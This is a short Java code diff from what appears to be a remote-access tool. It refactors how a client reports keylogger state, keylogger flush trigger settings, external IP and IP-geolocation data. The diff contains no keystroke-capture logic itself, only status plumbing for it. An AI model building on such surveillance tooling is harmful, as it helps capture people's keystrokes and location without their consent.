@@ -75,7 +75,7 @@ public final class Platform {
 
 		for (SimpleAttribute sa : SimpleAttribute.values()) {
 
-			if (!sa.valid(osFamily)) {
+			if (!sa.valid(osFamily, Common.instance)) {
 				continue;
 			}
 			if (sa == SimpleAttribute.NET_EXTERNALIP && !Client.ic.getAllowMiscConnections()) {
@@ -90,12 +90,6 @@ public final class Platform {
 
 		info.addAllGroupAttr(CPU.getAttributes());
 		info.addAllGroupAttr(DISP.getAttributes());
-
-		if (Common.instance == Instance.CLIENT) {
-			info.setKeyloggerState(Keylogger.isLogging() ? State.ONLINE : State.OFFLINE);
-			info.setFlushMethod(Client.ic.getKeyloggerFlushMethod());
-			info.setFlushValue(Client.ic.getKeyloggerFlushValue());
-		}
 
 		return info.build();
 	}
@@ -118,6 +112,18 @@ public final class Platform {
 			return CLIENT.getInstallDate();
 		case CLIENT_STATUS:
 			return CLIENT.getStatus();
+		case KEYLOGGER_STATE:
+			State s = null;
+			if (Keylogger.isInstalled()) {
+				s = Keylogger.isOnline() ? State.ONLINE : State.OFFLINE;
+			} else {
+				s = State.UNINSTALLED;
+			}
+			return "" + s.ordinal();
+		case KEYLOGGER_TRIGGER:
+			return "" + Client.ic.getKeyloggerFlushMethod().ordinal();
+		case KEYLOGGER_TRIGGER_VALUE:
+			return "" + Client.ic.getKeyloggerFlushValue();
 		case IPLOC_CITY:
 			return IPLocation.getCity();
 		case IPLOC_COUNTRY:
